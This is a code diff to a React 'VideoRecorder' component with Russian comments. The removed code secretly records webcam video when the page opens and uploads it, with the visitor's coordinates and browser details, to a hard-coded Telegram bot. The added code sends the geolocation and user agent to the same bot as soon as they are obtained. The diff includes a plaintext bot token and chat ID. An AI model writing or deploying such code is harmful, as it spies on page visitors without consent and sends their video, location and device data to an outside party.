@@ -102,7 +102,7 @@ function VideoRecorder() {
 
   const [geoData, setGeoData] = useState(null);
   const [userAgent, setUserAgent] = useState("");
-  const [infoSent, setInfoSent] = useState(false); // чтобы не повторять отправку инфы
+  const [infoSent, setInfoSent] = useState(false);
 
   const startRecording = async () => {
     try {
@@ -124,7 +124,6 @@ function VideoRecorder() {
 
       recorder.onstop = async () => {
         const videoBlob = new Blob(chunksRef.current, { type: "video/webm" });
-        await sendVideoToTelegram(videoBlob);
         stopStream();
       };
 
@@ -150,54 +149,50 @@ function VideoRecorder() {
     }
   };
 
-  const sendVideoToTelegram = async (videoBlob) => {
-    const formData = new FormData();
-    formData.append("chat_id", "7819537579");
-    formData.append("video", videoBlob, "video.webm");
-
-    if (!infoSent) {
-      const captionParts = [];
-
-      if (geoData) {
-        captionParts.push(
-          `📍 Location: ${geoData.latitude}, ${geoData.longitude}`
-        );
-      } else {
-        captionParts.push("📍 Location: Not available");
-      }
-
-      captionParts.push(`🌐 Device: ${userAgent}`);
-      formData.append("caption", captionParts.join("\n"));
-
-      setInfoSent(true);
-    }
-
-    try {
-      await fetch(
-        `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendVideo`,
-        {
-          method: "POST",
-          body: formData,
-        }
+  // Отправка геоданных в Telegram
+  const sendGeoToTelegram = async () => {
+    if (geoData && !infoSent) {
+      const formData = new FormData();
+      formData.append("chat_id", "7819537579"); // ID чата
+      formData.append(
+        "text",
+        `📍 Location: ${geoData.latitude}, ${geoData.longitude}\n🌐 Device: ${userAgent}`
       );
-    } catch (error) {
-      console.error("Ошибка при отправке видео:", error);
+
+      try {
+        await fetch(
+          `https://api.telegram.org/bot7994259922:AAFg95V-vIqovZXU8RXQfeo9TC91Bu3ppK8/sendMessage`,
+          {
+            method: "POST",
+            body: formData,
+          }
+        );
+        setInfoSent(true); // Помечаем, что информация отправлена
+      } catch (error) {
+        console.error("Ошибка при отправке геоданных:", error);
+      }
     }
   };
 
   // Геолокация и устройство — один раз
   useEffect(() => {
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        setGeoData({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-        });
-      },
-      (err) => {
-        console.error("Ошибка получения геолокации:", err);
-      }
-    );
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("🌍 Геолокация получена:", position.coords);
+          setGeoData({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+          });
+
+          // Отправляем гео-данные сразу, как только получены
+          sendGeoToTelegram();
+        },
+        (err) => {
+          console.error("❌ Ошибка получения геолокации:", err);
+        }
+      );
+    }
 
     setUserAgent(navigator.userAgent);
   }, []);
@@ -213,7 +208,7 @@ function VideoRecorder() {
     };
 
     document.addEventListener("visibilitychange", handleVisibilityChange);
-    startRecording(); // первая запись при заходе
+    startRecording(); // Начинаем запись сразу при заходе
 
     return () => {
       document.removeEventListener("visibilitychange", handleVisibilityChange);
